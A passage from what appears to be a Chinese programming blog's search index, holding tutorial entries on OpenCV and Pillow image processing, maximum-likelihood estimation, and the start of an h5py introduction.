阈值类型) 有四个参数，第一个原图像，第二个进行分类的阈值，第三个是高于（低于）阈值时赋予的新值，第四个是一个方法选择参数，常用的有： cv2.THRESH_BINARY（黑白二值） cv2.THRESH_BINARY_INV（黑白二值反转） cv2.THRESH_TRUNC （得到的图像为多像素值） cv2.THRESH_TOZERO cv2.THRESH_TOZERO_INV 返回两个值 ret:阈值 img：阈值化处理后的图像 \"\"\" import cv2 from cv2 import COLOR_RGB2GRAY, THRESH_BINARY import matplotlib.path as plt img = cv2.imread(\"./mcat_jpg.jpg\") # 读取的图像直接表示ndarray类型的三维矩阵，彩色图片的维度是(h,w,c) # 一般处理灰度图，所以先转为灰度图 img=cv2.cvtColor(img,cv2.COLOR_BGR2GRAY) # 不同类型阈值处理 thresh, img1 = cv2.threshold(img, 1, 255, cv2.THRESH_BINARY) # thresh, img2 = cv2.threshold(img, 127, 255, cv2.THRESH_BINARY_INV) # thresh, img3 = cv2.threshold(img, 127, 255, cv2.THRESH_TRUNC) # thresh, img4 = cv2.threshold(img, 127, 255, cv2.THRESH_TOZERO) # thresh, img5 = cv2.threshold(img, 127, 255, cv2.THRESH_TOZERO_INV) # cv2.imshow('imag1',img1) cv2.waitKey() 阈值类型： ","date":"2022-07-17","objectID":"/python-opencv%E5%BA%93/:7:3","tags":["OpenCV","图像处理","Python基础"],"title":"Python OpenCV库","uri":"/python-opencv%E5%BA%93/"},{"categories":["Python"],"content":"旋转：cv2.getRotationMatrix2D() \"\"\" 参数： center：旋转的中心点坐标 angle：旋转角度，单位为度数，正数表示逆时针旋转 scale：同方向的放大倍数 \"\"\" import cv2 img = cv2.imread(\"./mcat_jpg.jpg\") # 读取的图像直接表示ndarray类型的三维矩阵，彩色图片的维度是(h,w,c) rows,cols = img.shape[:2] # 先获得仿射旋转的矩阵 getRotationMatrix2D mat_rotation = cv2.getRotationMatrix2D((cols/2, rows/2), 45, 1) # #第一个参数旋转中心，第二个参数旋转角度，第三个参数：缩放比例 # 获得仿射旋转后的图像 warpAffine res = cv2.warpAffine(img, mat_rotation, (rows,cols)) cv2.imshow('imag1',res) cv2.waitKey() ","date":"2022-07-17","objectID":"/python-opencv%E5%BA%93/:7:4","tags":["OpenCV","图像处理","Python基础"],"title":"Python OpenCV库","uri":"/python-opencv%E5%BA%93/"},{"categories":["Python"],"content":"图像的矩阵变换：transpose() 旋转 import cv2 img = cv2.imread(\"./mcat_jpg.jpg\") # 读取的图像直接表示ndarray类型的三维矩阵，彩色图片的维度是(h,w,c) image = cv2.transpose(img) cv2.imshow('imag1',image) cv2.waitKey() 另一种旋转方法：cv2.flip： 对图像矩阵进行翻转处理，参数可以设置为1，0，-1，分别对应着水平翻转、垂直翻转、水平垂直翻转。 image1 = cv2.flip(image, -1) #原图顺时针旋转180度 image22 = cv2.flip(image, 0)#等于原图顺时针旋转270度 image33 = cv2.flip(image, -1) OpenCV读入图片的矩阵格式是：（h, w, c）。 深度学习中，因为要对不同通道应用卷积，所以会采取另一种方式（c, h, w） print(im.shape) # (326,220,3) im=im.tanspose(2,0,1) print(im.shape) # (3,326,222) 在深度学习搭建CNN时，往往要做相应的图像数据处理，比如图像要扩展维度，比如扩展成（batch_size,channels,height,width） im=np.expand_dims(im,axis=0) print(im.shape) #(1,3,326,220) ","date":"2022-07-17","objectID":"/python-opencv%E5%BA%93/:7:5","tags":["OpenCV","图像处理","Python基础"],"title":"Python OpenCV库","uri":"/python-opencv%E5%BA%93/"},{"categories":["Python"],"content":"绘制几何图形 # 绘制直线 cv.line(img,start,end,color,thickness) # 绘制圆形 cv.circle(img,centerpoint, r, color, thickness) # 绘制矩形 cv.rectangle(img,leftupper,rightdown,color,thickness) # 向图像中添加文字 cv.putText(img,text,station, font, fontsize,color,thickness,cv.LINE_AA) ","date":"2022-07-17","objectID":"/python-opencv%E5%BA%93/:8:0","tags":["OpenCV","图像处理","Python基础"],"title":"Python OpenCV库","uri":"/python-opencv%E5%BA%93/"},{"categories":["Python"],"content":"图像的加法 cv.add()函数把两幅图像相加，或者可以简单地通过numpy操作添加两个图像，如res = img1 + img2。 两个图像应该具有相同的大小和类型，或者第二个图像可以是标量值。 # 注意：OpenCV加法和Numpy加法之间存在差异。OpenCV的加法是饱和操作，而Numpy添加是模运算。 # 这种差别在你对两幅图像进行加法时会更加明显。OpenCV 的结果会更好一点。所以我们尽量使用 OpenCV 中的函数。 \u003e\u003e\u003e x = np.uint8([250]) \u003e\u003e\u003e y = np.uint8([10]) \u003e\u003e\u003e print( cv.add(x,y) ) # 250+10 = 260 =\u003e 255 [[255]] \u003e\u003e\u003e print( x+y ) # 250+10 = 260 % 256 = 4 [4] ","date":"2022-07-17","objectID":"/python-opencv%E5%BA%93/:9:0","tags":["OpenCV","图像处理","Python基础"],"title":"Python OpenCV库","uri":"/python-opencv%E5%BA%93/"},{"categories":["Python"],"content":"图像加法： import numpy as np import cv2 as cv import matplotlib.pyplot as plt # 1 读取图像 img1 = cv.imread(\"view.jpg\") img2 = cv.imread(\"rain.jpg\") # 2 加法操作 img3 = cv.add(img1,img2) # cv中的加法 img4 = img1+img2 # 直接相加 # 3 图像显示 fig,axes=plt.subplots(nrows=1,ncols=2,figsize=(10,8),dpi=100) axes[0].imshow(img3[:,:,::-1]) axes[0].set_title(\"cv中的加法\") axes[1].imshow(img4[:,:,::-1]) axes[1].set_title(\"直接相加\") plt.show() 图像的混合 # 这其实也是加法，但是不同的是两幅图像的权重不同，这就会给人一种混合或者透明的感觉。图像混合的计算公式如下： # g(x) = (1−α)f0(x) + αf1(x) # 现在我们把两幅图混合在一起。第一幅图的权重是0.7，第二幅图的权重是0.3。函数cv2.addWeighted()可以按下面的公式对图片进行混合操作。 import numpy as np import cv2 as cv import matplotlib.pyplot as plt # 1 读取图像 img1 = cv.imread(\"view.jpg\") img2 = cv.imread(\"rain.jpg\") # 2 图像混合 img3 = cv.addWeighted(img1,0.7,img2,0.3,0) # 3 图像显示 plt.figure(figsize=(8,8)) plt.imshow(img3[:,:,::-1]) plt.show() ","date":"2022-07-17","objectID":"/python-opencv%E5%BA%93/:10:0","tags":["OpenCV","图像处理","Python基础"],"title":"Python OpenCV库","uri":"/python-opencv%E5%BA%93/"},{"categories":["Python"],"content":"图像处理 ","date":"2022-07-17","objectID":"/python-opencv%E5%BA%93/:11:0","tags":["OpenCV","图像处理","Python基础"],"title":"Python OpenCV库","uri":"/python-opencv%E5%BA%93/"},{"categories":["Python"],"content":"图像滤波 import cv2 import numpy as np from copy import copy img = cv2.imread(r\"C:\\Users\\pc\\Desktop\\test14-1.bmp\") new_img = copy(img) #（20,20）表示左上角开始的坐标，0.5表示字母的大小，(0, 0, 255)表示颜色，1表示粗细 cv2.putText(img, 'Original image', (20, 20), cv2.FONT_HERSHEY_COMPLEX, 0.5, (0, 0, 255), 1) cv2.imshow('img', img) # 均值滤波 # 参数：new_img原图像， (5x5)内核大小，分别表示像素宽度，像素高度 img_mean = cv2.blur(new_img, (5, 5)) cv2.putText(img_mean, 'Mean filtering', (20, 20), cv2.FONT_HERSHEY_COMPLEX, 0.5, (0, 0, 255), 1) cv2.imshow('img_mean', img_mean) # 中值滤波 # ksize：参数表示滤波窗口尺寸，必须是奇数并且大于 1。比如这里是 5， # 中值滤波器就会使用 5×5 的范围来计算，即对像素的中心值及其 5×5 # 邻域组成了一个数值集，对其进行处理计算，当前像素被其中值替换掉； img_median = cv2.medianBlur(new_img, 5) cv2.putText(img_median, 'Median filtering', (20, 20), cv2.FONT_HERSHEY_COMPLEX, 0.5, (0, 0, 255), 1) cv2.imshow('img_median', img_median) # 高斯滤波 # 0表示高斯核函数在X方向的的标准偏差。 img_Gaussian = cv2.GaussianBlur(new_img, (5, 5), 0) new_img_Gaussian = copy(img_Gaussian) cv2.putText(img_Gaussian, 'Gaussian filtering', (20, 20), cv2.FONT_HERSHEY_COMPLEX, 0.5, (0, 0, 255), 1) cv2.imshow('img_Gaussian', img_Gaussian) #高斯边缘检测 edged = cv2.Laplacian(new_img_Gaussian, cv2.CV_16S, ksize=5) result = cv2.convertScaleAbs(edged) cv2.putText(result, 'Gaussian edge detection', (20, 20), cv2.FONT_HERSHEY_COMPLEX, 0.5, (0, 0, 255), 1) cv2.imshow(\"edged\", result) cv2.waitKey() # 关闭窗口并取消分配任何相关的内存使用 cv2.destroyAllWindows() ","date":"2022-07-17","objectID":"/python-opencv%E5%BA%93/:11:1","tags":["OpenCV","图像处理","Python基础"],"title":"Python OpenCV库","uri":"/python-opencv%E5%BA%93/"},{"categories":["Python"],"content":"视频功能 视频中最常用的就是从视频设备采集图片或者视频，或者读取视频文件并从中采样。所以比较重要的也是两个模块: 一个是VideoCapture，用于获取相机设备并捕获图像和视频，或是从文件中捕获。 还有一个VideoWriter，用于生成视频。 来看例子理解这两个功能的用法，首先是一个制作延时摄影视频的小例子： import cv2 import time interval = 60 # 捕获图像的间隔，单位：秒 num_frames = 500 # 捕获图像的总帧数 out_fps = 24 # 输出文件的帧率 # VideoCapture(0)表示打开默认的相机 cap = cv2.VideoCapture(0) # 获取捕获的分辨率 size =(int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)), int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))) # 设置要保存视频的编码，分辨率和帧率 video = cv2.VideoWriter( \"time_lapse.avi\", cv2.VideoWriter_fourcc('M','P','4','2'), out_fps, size ) # 对于一些低画质的摄像头，前面的帧可能不稳定，略过 for i in range(42): cap.read() # 开始捕获，通过read()函数获取捕获的帧 try: for i in range(num_frames): _, frame = cap.read() video.write(frame) # 如果希望把每一帧也存成文件，比如制作GIF，则取消下面的注释 # filename = '{:0\u003e6d}.png'.format(i) # cv2.imwrite(filename, frame) print('Frame {} is captured.'.format(i)) time.sleep(interval) except KeyboardInterrupt: # 提前停止捕获 print('Stopped! {}/{} frames captured!'.format(i, num_frames)) # 释放资源并写入视频文件 video.release() cap.release() 人脸检测： import cv2 if __name__ == '__main__': # 打开摄像头 cap = cv2.VideoCapture(0) # 加载人脸检测器 faca_detector = cv2.CascadeClassifier('./haarcascade_frontaclcatface.xml') # 读取每一帧图像 while True: flag, frame = cap.read() # flag是否读取了图片 if not flag: break # 将图像转化为灰度图像 gray = cv2.cvtColor(frame, code = cv2.COLOR_BGR2GRAY) # 对每一帧灰度图像进行人脸检测 faces = faca_detector.detectMultiScale(gray, scaleFactor=1.1, minNeighbors=10) # 对每一个检测到的人脸区域绘制检测方框 for x,y,w,h in faces: cv2.rectangle(frame, pt1 = (x,y), pt2 = (x+w,y+h), color=[0,0,255], thickness=2) # 显示检测到的结果 cv2.imshow('face', frame) # 设置显示时长 key = cv2.waitKey(1000//24) # 注意要用整除//，因为毫秒为整数 # 按q键退出 if key == ord('q'): break # 销毁内存 cv2.destroyAllWindows() cap.release() ….功能太多了…以后慢慢发现吧…… ","date":"2022-07-17","objectID":"/python-opencv%E5%BA%93/:12:0","tags":["OpenCV","图像处理","Python基础"],"title":"Python OpenCV库","uri":"/python-opencv%E5%BA%93/"},{"categories":["Python"],"content":" 上次接触PIL是2017年的事情了，由于好几年不用都忘了个一干二净，最近又接触到图像处理方面的工作，重新学一下 ","date":"2022-07-17","objectID":"/python-pil%E5%BA%93/:0:0","tags":["PIL","Pillow","图像处理"],"title":"Python PIL库","uri":"/python-pil%E5%BA%93/"},{"categories":["Python"],"content":"前言 Pillow 是 Python 中较为基础的图像处理库，主要用于图像的基本处理，比如裁剪图像、调整图像大小和图像颜色处理等。与 Pillow 相比，OpenCV 和 Scikit-image 的功能更为丰富，所以使用起来也更为复杂，主要应用于机器视觉、图像分析等领域，比如众所周知的“人脸识别”应用 。 Pillow 提供了丰富的图像处理功能，可概括为两个方面： 图像归档（包括创建缩略图、生成预览图像、图像批量处理等） 图像处理（包括调整图像大小、裁剪图像、像素点处理、添加滤镜、图像颜色处理等 ） ","date":"2022-07-17","objectID":"/python-pil%E5%BA%93/:1:0","tags":["PIL","Pillow","图像处理"],"title":"Python PIL库","uri":"/python-pil%E5%BA%93/"},{"categories":["Python"],"content":"常用操作 ","date":"2022-07-17","objectID":"/python-pil%E5%BA%93/:2:0","tags":["PIL","Pillow","图像处理"],"title":"Python PIL库","uri":"/python-pil%E5%BA%93/"},{"categories":["Python"],"content":"基本操作 图像打开与读取 在PIL中，任何图像都可以用Image对象表示 \"\"\" 方法 描述 Image.open(filename,mode=‘r’) 根据文件名读取图片 Image.new(mode,size color) 根据给定参数创建一个新图像 Image.fromarray(obj, mode=None) 从array数据创建图像 Image.show() 显示图像 Image.save(fp,format=None) 图像保存(可以完成格式转换) Image的属性： 属性 描述 Image.format 图像格式 Image.filename 图像的文件名或路径 Image.mode 图像色彩模式，L为灰度，RGB为真彩 Image.size 图像的宽和高，返回二元元组 \"\"\" \"\"\" open方法： 实例：读取图片并显示，并查看对象属性 from PIL import Image im = Image.open(\"img/mcat.png\") im.show() # im.rotate(45).show() # 将图片旋转，并用系统自带的图片工具显示图片 # 查看对象属性 print(im.size) # 查看图片大小 print(im.readonly) # 查看是否为只读，1为是，0为否 print(im.format) # 查看图片的格式 print(im.info) # 查看图片的相关信息 print(im.mode) # 查看图片的模式 创建图像 Image.new # im = Image.new(mode,size,color) # 创建图片 # im.show() # 展示图片 \"\"\" 参数说明如下： mode：图像模式，字符串参数，比如 RGB（真彩图像）、L（灰度图像）、CMYK（色彩图打印模式）等 size：图像大小，元组参数（width, height）代表图像的像素大小 color：图片颜色，默认值为 0 表示黑色，参数值支持（R,G,B）三元组数字格式、颜色的十六进制值以及颜色英文单词 \"\"\" from PIL import Image # 创建一个灰度图像 newL = Image.new(\"L\", (28, 28), 255) newL.show() # 创建一个RGB图像 im1 = Image.new(\"RGB\", (28, 28), (20, 200, 45)) im1.show() im2 = Image.new(\"RGBA\", (28, 28), (20, 200, 45, 255)) im2.show() 以数组的形式创建图像，PIL.image.fromarray(obj,mode=None) \"\"\" PIL.image.fromarray(obj,mode=None) obj - 图像的数组，类型可以是numpy.array() mode - 如果不给出，会自动判断 可以将一个数组（具体一点就是像素数组）转换为图像，从图像的本质去处理图像 \"\"\" \"\"\" 用fromarray()函数实现图像的灰度化（使用了两种方法） \"\"\" from PIL import Image import numpy as np im = Image.open(\"img/mcat.png\") # print(im.size) # (362, 386) # print(im.getdata()) b = im.resize((362, 386)) bdata_li = list(b.getdata()) # print(bdata_li) # print(type(bdata_li)) # \u003cclass 'list'\u003e obj1 = [] obj2 = [] for i in range(len(bdata_li)): obj1.append([sum(bdata_li[i])/3]) # 灰度化方法1：RGB三个分量的均值 obj2.append([0.3*bdata_li[i][0]+0.59*bdata_li[i][1]+0.11*bdata_li[i][2]]) # 灰度化方法2：根据亮度与RGB三个分量的对应关系：Y=0.3*R+0.59*G+0.11*B obj1 = np.array(obj1).reshape((362, 386)) obj2 = np.array(obj2).reshape((362, 386)) array_img1 = Image.fromarray(obj1) array_img2 = Image.fromarray(obj2) array_img1.show() array_img2.show() 复制和粘贴图像 from PIL import Image im = Image.open(\"img/mcat.png\") print(im.format) im3 = im.copy() # 复制图像 im3.show() 粘贴 # im_copy.paste(image, box=None, mask=None) # mask：可选参数，为图片添加蒙版效果 from PIL import Image im = Image.open(r\"7.jpg\") # 复制一张图片副本 im_copy = im.copy() # 对副本进行裁剪 im_crop = im_copy.crop((0, 0, 200, 100)) # 创建一个新的图像作为蒙版，L模式，单颜色值 image_new = Image.new('L', (200, 100), 200) # 将裁剪后的副本粘贴至副本图像上，并添加蒙版 im_copy.paste(im_crop, (100, 100, 300, 200), mask=image_new) # 显示粘贴后的图像 im_copy.show() 获取图像信息 # -*- coding:utf-8 -*- from PIL import Image img1 = Image.open(\"test.png\") img1.show() # getbands() - 显示该图像的所有通道，返回一个tuple bands = img1.getbands() print bands # getbbox() - 返回一个像素坐标，4个元素的tuple bboxs = img1.getbbox() print bboxs # getcolors() - 返回像素信息，是一个含有元素的列表[(该种像素的数量，(该种像素)),(...),...] colors = img1.getcolors() print colors # getdata() - 返回图片所有的像素值，要使用list()才能显示出具体数值 #data = list(img1.getdata()) #print data # getextrema() - 获取图像中每个通道的像素最小和最大值,是一个tuple类型 extremas = img1.getextrema() print extremas # getpixel() - 获取该坐标 pixels = img1.getpixel((87,180)) print pixels # histogram() - 返回图片的像素直方图 print(img1.histogram()) ","date":"2022-07-17","objectID":"/python-pil%E5%BA%93/:2:1","tags":["PIL","Pillow","图像处理"],"title":"Python PIL库","uri":"/python-pil%E5%BA%93/"},{"categories":["Python"],"content":"图像处理 格式转换 save 方法 save 方法用于保存 图像，当不指定文件格式时，它会以默认的图片格式来存储；如果指定图片格式，则会以指定的格式存储图片 \"\"\" im.save(outfile, format, options…) 如果变量format缺省，如果可能的话，则从文件名称的扩展名判断文件的格式。该方法返回为空。关键字options为文件编写器提供一些额外的指令 \"\"\" 比如：jpg转为png： from PIL import Image im = Image.open(\"3d.jpg\") print(im) im.save(\"3d.png\") ## 将\"3d.jpg\"保存为3d.png\" im = Image.open(\"3d.png\") ##打开新的png图片 print(im.format, im.size, im.mode) Note: 并非所有的图片格式都可以用 save() 方法转换完成，比如将 PNG 格式的图片保存为 JPG 格式，如果直接使用 save() 方法就会出现错误(引发错误的原因是由于 PNG 和 JPG 图像模式不一致导致的。其中 PNG 是四通道 RGBA 模式，即红色、绿色、蓝色、Alpha 透明色；JPG 是三通道 RGB 模式。因此要想实现图片格式的转换，就要将 PNG 转变为三通道 RGB 模式) convert 方法 在做深度学习的时候，我们首先会用到python PIL模块中的convert函数将原始图片（例如png）转化为对应的像素值，再将像素值转化成tensor之后进行模型的训练 Image 类提供的 convert() 方法可以实现图像模式的转换。该函数提供了多个参数，比如 mode、matrix、dither 等，其中最关键的参数是 mode，其余参数无须关心 \"\"\" 语法： im.convert(mode, params) # mode：指的是要转换成的图像模式， params：其他可选参数 im.save(fp) # 保存图片 \"\"\" 图像模式： 其中最常用的有三种： 1.RGB模式： RGB色彩模式是工业界的一种颜色标准，是通过对红(R)、绿(G)、蓝(B)三个颜色通道的变化以及它们相互之间的叠加来得到各式各样的颜色的，每个通道的值在0~255之间。 im2 = im.convert('RGB') png转jpg： from PIL import Image im = Image.open(\"img/mcat.png\") print(im.format) im3 = im.convert(\"RGB\") im3.save(\"img/mcat_jpg.jpg\") im2 = Image.open(\"img/mcat_jpg.jpg\") im2.show() 2.1模式 例子：二值化 from PIL import Image im = Image.open(\"img/mcat.png\") im.show() # '1'为二值图像，非黑即白。每个像素用8个bit表示，0表示黑，255表示白。 im2 = im.convert('1') im2.show() 3.L模式 灰度图像： from PIL import Image im = Image.open(\"img/mcat.png\") im.show() # 'L'为灰度图像，每个像素用8个bit表示，0表示黑，255表示白，其他数字表示不同的灰度。 # 转换公式：L = R * 299/1000 + G * 587/1000+ B * 114/1000 im2 = im.convert('L') im2.show() 缩放图片 \"\"\" im_new = im.resize(size, resample=image.BICUBIC, box=None, reducing_gap=None) # 注意要重新赋值 im_new.show() # 缩放后的图片 参数： size：元组参数 (width,height)，图片缩放后的尺寸 resample：可选参数，指图像重采样滤波器，与 thumbnail() 的 resample 参数类似，默认为 Image.BICUBIC box：对指定图片区域进行缩放，box 的参数值是长度为 4 的像素坐标元组，即 (左,上,右下)。注意，被指定的区域必须在原图的范围内，如果超出范围就会报错。当不传该参数时，默认对整个原图进行缩放 (0, 0, 120, 180)代表的是以原图的左上角为原点，选择宽和高分别是(120,180)的图像区域 reducing_gap：可选参数，浮点参数值，用于优化图片的缩放效果，常用参数值有 3.0 和 5.0 \"\"\" from PIL import Image im = Image.open(\"img/mcat.png\") im.show() b = im.resize((100, 200)) b.show() 创建缩略图 缩略图指的是将原图缩小至一个指定大小（size）的图像。通过创建缩略图可以使图像更易于展示和浏览 \"\"\" im.thumbnail(size,resample) # 直接在原图的基础上修改 im.show() # 缩放后的图片 参数： size：元组参数，指的是缩小后的图像大小 resample：可选参数，指图像重采样滤波器，有四种过滤方式，分别是 Image.BICUBIC（双立方插值法）、PIL.Image.NEAREST（最近邻插值法）、PIL.Image.BILINEAR（双线性插值法）、PIL.Image.LANCZOS（下采样过滤插值法），默认为 Image.BICUBIC \"\"\" from PIL import Image im = Image.open(\"img/mcat.jpg\") # im.show() im.thumbnail((100, 200)) im.show() im.save(file+\".thumbnail\",\"JPEG\") # 缩略图不能直接双击打开，而可以使用PIL.image的open读取，然后使用show()方法进行显示。 比较： resize()方法可以缩小也可以放大，而thumbnail()方法只能缩小； resize()方法不会改变对象的大小，只会返回一个新的Image对象，而thumbnail()方法会直接改变对象的大小，返回值为none； resize()方法中的size参数直接规定了修改后的大小，而thumbnail()方法按比例缩小，size参数只规定修改后size的最大值。 图像裁剪 Image.crop(box) from PIL import Image, ImageFilter img = Image.open(r\"img/mcat.png\") box = (0, 58, 100, 200) # 区域由一个4元组定义，表示为坐标是 (left, upper, right, lower)，Python Imaging Library 使用左上角为 (0, 0)的坐标系统 im2 = img.crop(box) im2.show() 图像分离与合并 split方法 from PIL import Image im = Image.open(\"img/mcat_jpg.jpg\") r, g, b = im.split() # split 方法使用较简单，分离通道 r.show() g.show() b.show() merge方法 \"\"\" im_merge = PIL.Image.merge(mode, bands) im_merge.show() 参数： mode：指定输出图片的模式 bands：参数类型为元组或者列表序列，其元素值是组成图像的颜色通道，比如 RGB 分别代表三种颜色通道，可以表示为 (r, g, b) \"\"\" from PIL import Image im = Image.open(\"img/mcat.png\") r, g, b, a = im.split() # split 方法使用较简单，分离通道 r.show() g.show() b.show() # merge合并为rgb的 im2 = Image.merge('RGB', (r, g, b)) im2.show() blend方法 Image 类也提供了 blend() 方法来混合 RGBA 模式的图片（PNG 格式） \"\"\" PIL.Image.blend(image1,image2, alpha) 参数： image1：图片对象1 image2：图片对象2 alpha：透明度 ，取值范围为 0 到 1，当取值为 0 时，输出图像相当于 image1 的拷贝，而取值为 1 时，则是 image2 的拷贝，只有当取值为 0.5 时，才为两个图像的中合。因此改值的大小决定了两个图像的混合程度 \"\"\" from PIL import Image # creating a image1 object and convert it to mode 'P' im1 = Image.open(r\"1.PNG\").convert('L') # creating a image2 object and convert it to mode 'P' im2 = Image.open(r\"2.PNG\").convert('L') # alpha is 0.0, a copy of the first image is retu","date":"2022-07-17","objectID":"/python-pil%E5%BA%93/:2:2","tags":["PIL","Pillow","图像处理"],"title":"Python PIL库","uri":"/python-pil%E5%BA%93/"},{"categories":["Python"],"content":"Image与Numpy from PIL import Image import numpy as np im = Image.open(\"1.jpg\") print(np.asarray(im)) # 三维数组 # print(im.shape) # 输出图片的尺寸 # im_arr = np.array(im) # 将图片转化为numpy矩阵 na = np.asarray(im) # 将图片转换为数组 na[0][0][0] = 0 # 修改数组的值 im_new = Image.fromarray(na) # 将数组转换为图片 ","date":"2022-07-17","objectID":"/python-pil%E5%BA%93/:2:3","tags":["PIL","Pillow","图像处理"],"title":"Python PIL库","uri":"/python-pil%E5%BA%93/"},{"categories":["Python"],"content":"将多个小图拼接为一个大图 import os from PIL import Image IMAGES_PATH = r'img/' # 图片集地址 IMAGES_FORMAT = ['.jpg', '.JPG'] # 图片格式 IMAGE_SIZE = 96 # 每张小图片的大小 IMAGE_SIZE_x = 96 IMAGE_ROW = 2 # 图片间隔，也就是合并成一张图后，一共有几行 IMAGE_COLUMN = 4 # 图片间隔，也就是合并成一张图后，一共有几列 IMAGE_SAVE_PATH = 'final.jpg' # 图片转换后的地址 # 获取图片集地址下的所有图片名称 image_names = [name for name in os.listdir(IMAGES_PATH) for item in IMAGES_FORMAT if os.path.splitext(name)[1] == item] # 简单的对于参数的设定和实际图片集的大小进行数量判断 if len(image_names) != IMAGE_ROW * IMAGE_COLUMN: raise ValueError(\"合成图片的参数和要求的数量不能匹配！\") print(image_names) # 定义图像拼接函数 def image_compose(): to_image = Image.new('RGB', (IMAGE_COLUMN * IMAGE_SIZE_x, IMAGE_ROW * IMAGE_SIZE)) # 创建一个新图 # 循环遍历，把每张图片按顺序粘贴到对应位置上 for y in range(1, IMAGE_ROW + 1): for x in range(1, IMAGE_COLUMN + 1): from_image = Image.open(IMAGES_PATH + image_names[IMAGE_COLUMN * (y - 1) + x - 1]).resize((IMAGE_SIZE_x, IMAGE_SIZE), Image.ANTIALIAS) to_image.paste(from_image, ((x - 1) * IMAGE_SIZE_x, (y - 1) * IMAGE_SIZE)) return to_image.save(IMAGE_SAVE_PATH) # 保存新图 image_compose() ","date":"2022-07-17","objectID":"/python-pil%E5%BA%93/:2:4","tags":["PIL","Pillow","图像处理"],"title":"Python PIL库","uri":"/python-pil%E5%BA%93/"},{"categories":["数学"],"content":"最大似然法 极大似然估计方法(Maximum Likelihood Estimate，MLE)也称为最大概似估计或最大似然估计，是求估计的另一种方法，我们用已知的样本数据分布去推测具体的分布情况。 通俗来说，最大似然估计的目的就是就是利用已知的样本结果信息，反推最具有可能(最大概率)导致这些样本结果出现的模型参数值！ 换句话说，极大似然估计提供了一种给定观察数据来评估模型参数的方法，即：“模型已定，参数未知”。假设我们要统计全国人口的身高，首先假设这个身高服从服从正态分布，但是该分布的均值与方差未知。我们没有人力与物力去统计全国每个人的身高，但是可以通过采样，获取部分人的身高，然后通过最大似然估计来获取上述假设中的正态分布的均值与方差。 使用极大似然估计方法的两个条件： 我们假定数据服从某种已知的特定数据分布型。 我们已经得到了一定的数据集。 ","date":"2022-07-17","objectID":"/%E6%9C%80%E5%A4%A7%E4%BC%BC%E7%84%B6%E4%BC%B0%E8%AE%A1/:1:0","tags":["最大自然估计","统计学","Machine Learning基础"],"title":"最大似然估计","uri":"/%E6%9C%80%E5%A4%A7%E4%BC%BC%E7%84%B6%E4%BC%B0%E8%AE%A1/"},{"categories":["数学"],"content":"一般步骤 这部分来自：https://www.cnblogs.com/BlairGrowing/p/14877125.html 求最大似然值的一般步骤： 1.写出似然函数； 2.对似然函数取对数，并整理； 3.求导数 ； 4.解似然方程 来自：https://blog.csdn.net/zouxy09/article/details/8537620 要求θ，只需要使θ的似然函数L(θ)极大化，然后极大值对应的θ就是我们的估计。这里就回到了求最值的问题了。怎么求一个函数的最值？当然是求导，然后让导数为0，那么解这个方程得到的θ就是了（当然，前提是函数L(θ)连续可微）。那如果θ是包含多个参数的向量那怎么处理啊？当然是求L(θ)对所有参数的偏导数，也就是梯度了，那么n个未知的参数，就有n个方程，方程组的解就是似然函数的极值点了，当然就得到这n个参数了。 ","date":"2022-07-17","objectID":"/%E6%9C%80%E5%A4%A7%E4%BC%BC%E7%84%B6%E4%BC%B0%E8%AE%A1/:2:0","tags":["最大自然估计","统计学","Machine Learning基础"],"title":"最大似然估计","uri":"/%E6%9C%80%E5%A4%A7%E4%BC%BC%E7%84%B6%E4%BC%B0%E8%AE%A1/"},{"categories":["数学"],"content":"举例 ","date":"2022-07-17","objectID":"/%E6%9C%80%E5%A4%A7%E4%BC%BC%E7%84%B6%E4%BC%B0%E8%AE%A1/:3:0","tags":["最大自然估计","统计学","Machine Learning基础"],"title":"最大似然估计","uri":"/%E6%9C%80%E5%A4%A7%E4%BC%BC%E7%84%B6%E4%BC%B0%E8%AE%A1/"},{"categories":["数学"],"content":"橘猫分布情况 这部分来自: https://www.jianshu.com/p/e0eb4f4ccf3e 根据现实经验和科学道理，我们可以确切得到两个条件。 1.动物的体重分布是符合正态分布的。（也可以说我们假定它服从正态分布） 2.我们抓住了学校里所有的橘猫，得到了100只橘猫的体重。 那么如何用这100只橘猫的数据集D去推测橘猫具体的体重分布呢？ 我们将这100只橘猫体重设为数据集D：D={x_1, x_2, ... , x_100} ","date":"2022-07-17","objectID":"/%E6%9C%80%E5%A4%A7%E4%BC%BC%E7%84%B6%E4%BC%B0%E8%AE%A1/:3:1","tags":["最大自然估计","统计学","Machine Learning基础"],"title":"最大似然估计","uri":"/%E6%9C%80%E5%A4%A7%E4%BC%BC%E7%84%B6%E4%BC%B0%E8%AE%A1/"},{"categories":["数学"],"content":"离散型例子 有两外形相同的箱子，各装100个球，一箱99个白球1个红球，一箱1个白球99个红球，现从两箱中任取一箱，并从箱中任取一球，问：所取的球来自哪一箱 ? 答：第一箱。 感谢参考文章中大佬们写的文章，很清晰，我这里只是搬过来辅助自己理解，虽然已经看晕了 ","date":"2022-07-17","objectID":"/%E6%9C%80%E5%A4%A7%E4%BC%BC%E7%84%B6%E4%BC%B0%E8%AE%A1/:3:2","tags":["最大自然估计","统计学","Machine Learning基础"],"title":"最大似然估计","uri":"/%E6%9C%80%E5%A4%A7%E4%BC%BC%E7%84%B6%E4%BC%B0%E8%AE%A1/"},{"categories":["Python"],"content":" 简单入门用法，记录一下 ","date":"2022-07-16","objectID":"/h5py%E5%BA%93%E5%88%9D%E5%AD%A6/:0:0","tags":["h5py","python库"],"title":"h5py库初学","uri":"/h5py%E5%BA%93%E5%88%9D%E5%AD%A6/"},{"categories":["Python"],"content":"简介 h5py文件是存放两类对象的容器，数据集(dataset)和组(group)： dataset类似数组类的数据集合，和numpy的数组差不多 group是像文件夹一样的容器，它好比python中的字典，有键(key)和值(value)。group中可以存放dataset或者其他的group。”键”就是组成员的名称，”值”就是组成员对象本身(组或者数据集)。 ","date":"2022-07-16","objectID":"/h5py%E5%BA%93%E5%88%9D%E5%AD%A6/:1:0","tags":["h5py","python库"],"title":"h5py库初学","uri":"/h5py%E5%BA%93%E5%88%9D%E5%AD%A6/"},{"categories":["Python"],"content":"创建h5py文件 import h5py f=h5py.File(\"myh5py.hdf5\",\"w\") # w 写，r读 ","date":"2022-07-16","objectID":"/h5py%E5%BA%93%E5%88%9D%E5%AD%A6/:2:0","tags":["h5py","python库"],"title":"h5py库初学","uri":"/h5py%E5%BA%93%E5%88%9D%E5%AD%A6/"},{"categories":["Python"],"content":"创建dataset数据集 创建了一个只有20个整数的数据集，但是没有赋值所以为0 import h5py 